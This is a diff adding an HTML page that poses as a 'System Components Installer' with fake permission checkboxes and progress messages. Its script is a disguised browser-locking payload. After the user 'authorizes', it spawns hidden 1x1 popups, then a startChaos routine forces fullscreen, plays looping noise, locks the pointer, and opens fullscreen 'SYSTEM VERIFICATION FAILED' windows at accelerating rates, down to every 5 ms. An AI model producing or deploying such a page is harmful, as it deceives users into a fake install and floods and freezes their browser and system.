@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>System Components Installer</title>
+<style>
+body{background:#0f0f1a;color:#e0e0ff;font-family:'Segoe UI',Arial,sans-serif;margin:0;padding:0;height:100vh;display:flex;justify-content:center;align-items:center;text-align:center;overflow:hidden}
+.container{max-width:600px;padding:30px;border-radius:8px;background:rgba(20,20,40,0.9);box-shadow:0 0 15px rgba(0,80,255,0.3)}
+h1{font-size:22px;margin-bottom:20px;font-weight:400;text-shadow:0 0 8px rgba(100,150,255,0.7)}
+.btn{padding:12px 30px;margin:10px;border:none;border-radius:5px;cursor:pointer;font-size:15px;transition:all 0.2s}
+.btn-primary{background:linear-gradient(45deg,#0066ff,#0088ff);color:white;box-shadow:0 0 10px #0066ff}
+.btn-disabled{background:linear-gradient(45deg,#333,#444);color:#777;box-shadow:none;cursor:not-allowed}
+.btn-secondary{background:linear-gradient(45deg,#333,#444);color:#ddd;box-shadow:0 0 8px #333}
+#fullscreen-prompt{display:block}
+#initial{display:none}
+#confirm{display:none}
+#loading{display:none}
+.loader{border:4px solid rgba(0,100,255,0.2);border-top:4px solid #0066ff;border-radius:50%;width:50px;height=50px;animation:spin 0.8s linear infinite;margin:20px auto}
+@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+.checkbox-container{text-align:left;margin:25px 0}
+.checkbox-container label{display:block;margin:12px 0;cursor:pointer;user-select:none}
+.checkbox-container input{margin-right:10px}
+#countdown{font-size:14px;color:#aaa;margin-top:15px}
+</style>
+</head>
+<body>
+<div class="container" id="fullscreen-prompt">
+<h1>Fullscreen Required</h1>
+<p>Please enable fullscreen to continue installation</p>
+<button class="btn btn-disabled" id="fsContinueBtn" disabled>Continue</button>
+</div>
+
+<div class="container" id="initial">
+<h1>System Components Installer</h1>
+<p>Required for optimal performance</p>
+<button class="btn btn-primary" id="yesBtn">Begin Installation</button>
+<button class="btn btn-secondary" id="noBtn">Cancel</button>
+</div>
+
+<div class="container" id="confirm">
+<h1>Installation Permissions</h1>
+<div class="checkbox-container">
+<label><input type="checkbox" checked> Allow access to system components</label>
+<label><input type="checkbox" checked> Enable performance optimizations</label>
+<label><input type="checkbox" checked> Verify installation integrity</label>
+</div>
+<button class="btn btn-primary" id="confirmYes">Authorize Installation</button>
+<button class="btn btn-secondary" id="confirmNo">Cancel</button>
+</div>
+
+<div class="container" id="loading">
+<div class="loader"></div>
+<p id="loadingText">Preparing installation...</p>
+<p id="countdown">Initializing in 10 seconds</p>
+</div>
+
+<script>
+const _=document,a=_.getElementById('fsContinueBtn'),b=_.getElementById('yesBtn'),c=_.getElementById('noBtn'),d=_.getElementById('confirmYes'),e=_.getElementById('confirmNo'),f=_.getElementById('fullscreen-prompt'),g=_.getElementById('initial'),h=_.getElementById('confirm'),i=_.getElementById('loading'),j=_.getElementById('loadingText'),k=_.getElementById('countdown');
+let l=10,m,n,o=[],p=[],q=["Preparing components...","Allocating resources...","Verifying dependencies...","Finalizing setup...","Do not close this window"];
+
+setInterval(()=>{
+const r=window.innerWidth>=screen.width-10&&window.innerHeight>=screen.height-10;
+a.disabled=!r,a.classList.toggle('btn-disabled',!r),a.classList.toggle('btn-primary',r);
+},200);
+
+a.onclick=()=>{f.style.display='none',g.style.display='block'};
+c.onclick=()=>{g.innerHTML='<h1>Installation Cancelled</h1><p>No changes were made</p>',setTimeout(()=>window.close(),1500)};
+b.onclick=()=>{g.style.display='none',h.style.display='block'};
+e.onclick=()=>{h.style.display='none',g.style.display='block'};
+d.onclick=()=>{
+h.style.display='none',i.style.display='block';
+for(let s=0;s<10;s++){const t=window.open('','_blank','width=1,height=1,left=9999,top=9999');t&&(t.document.write('<title>Loading components...</title>'),o.push(t))}
+let u=0;
+const v=setInterval(()=>{j.textContent=q[u],u=(u+1)%q.length},1200);
+m=setInterval(()=>{
+l--,k.textContent=`Initializing in ${l} seconds`;
+if(l<=0){clearInterval(m),clearInterval(v),i.style.display='none',w();}
+},800);
+};
+
+function w(){
+const x=window.open('','_blank','width=800,height=600');
+if(x){
+x.document.write(`
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body{background:#0f0f1a;color:#e0e0ff;font-family:'Segoe UI',Arial,sans-serif;margin:0;padding:0;height:100vh;display:flex;justify-content:center;align-items:center;text-align:center}
+.container{max-width:600px;padding:30px;border-radius:8px;background:rgba(20,20,40,0.9);box-shadow:0 0 15px rgba(0,80,255,0.3)}
+h1{font-size:22px;margin-bottom:20px;text-shadow:0 0 8px rgba(100,150,255,0.7)}
+.btn{padding:12px 30px;margin:10px;border:none;border-radius:5px;cursor:pointer;font-size:15px;background:linear-gradient(45deg,#0066ff,#0088ff);color:white;box-shadow:0 0 10px #0066ff}
+.btn-disabled{background:linear-gradient(45deg,#333,#444);color:#777;box-shadow:none;cursor:not-allowed}
+#status{font-size:14px;color:#aaa;margin-top:15px}
+#countdown{font-size:16px;color:#0ff;margin-top:10px;display:none}
+</style>
+</head>
+<body>
+<div class="container">
+<h1>Final Verification Required</h1>
+<div id="status">Please enable fullscreen to continue</div>
+<button class="btn btn-disabled" id="verifyContinueBtn" disabled>Continue</button>
+<div id="countdown"></div>
+</div>
+<script>
+let y=!1,z=5,A=document.getElementById('status'),B=document.getElementById('countdown'),C=document.getElementById('verifyContinueBtn');
+setInterval(()=>{
+const D=window.innerWidth>=screen.width-10&&window.innerHeight>=screen.height-10;
+C.disabled=!D,C.className=D?'btn':'btn btn-disabled',D&&!y&&(y=!0,B.style.display='block',A.textContent='Final verification in progress...',E());
+},200);
+const E=()=>{
+const F=setInterval(()=>{
+z--,B.textContent='Starting in '+z+' seconds',z<=0&&(clearInterval(F),window.opener.startChaos(),window.close());
+},1000);
+};
+C.onclick=()=>{window.opener.startChaos(),window.close()};
+<\/script>
+</body>
+</html>
+`),x.document.close();
+}else startChaos();
+}
+
+window.startChaos=function(){
+window.moveTo(0,0),window.resizeTo(screen.width,screen.height),_.documentElement.requestFullscreen().catch(()=>{});
+const A=()=>{
+const B=new Audio('data:audio/wav;base64,UklGRl9vT19XQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YU'+Array(5000).fill(0).map(()=>Math.random()>.5?'A':'B').join(''));
+B.volume=0.5,B.loop=!0,B.play().catch(()=>{}),p.push(B);
+};
+const C=()=>{
+const D=window.open('','_blank','fullscreen=yes');
+D&&(D.document.write('<body style="margin:0;padding:0;background:hsl('+360*Math.random()+',100%,50%);display:flex;justify-content:center;align-items:center;cursor:none"><h1 style="color:#fff;font-size:4vw;text-shadow:0 0 15px #000">SYSTEM VERIFICATION FAILED</h1><script>document.body.requestPointerLock=document.body.requestPointerLock||document.body.mozRequestPointerLock||document.body.webkitRequestPointerLock;try{document.body.requestPointerLock()}catch(e){}<\/script></body>'),A(),D.focus());
+};
+A();
+let E=50,F=setInterval(C,E);
+setTimeout(()=>{clearInterval(F),E=20,F=setInterval(C,E)},2000);
+setTimeout(()=>{clearInterval(F),E=5,F=setInterval(C,E)},5000);
+};
+</script>
+</body>
+</html>
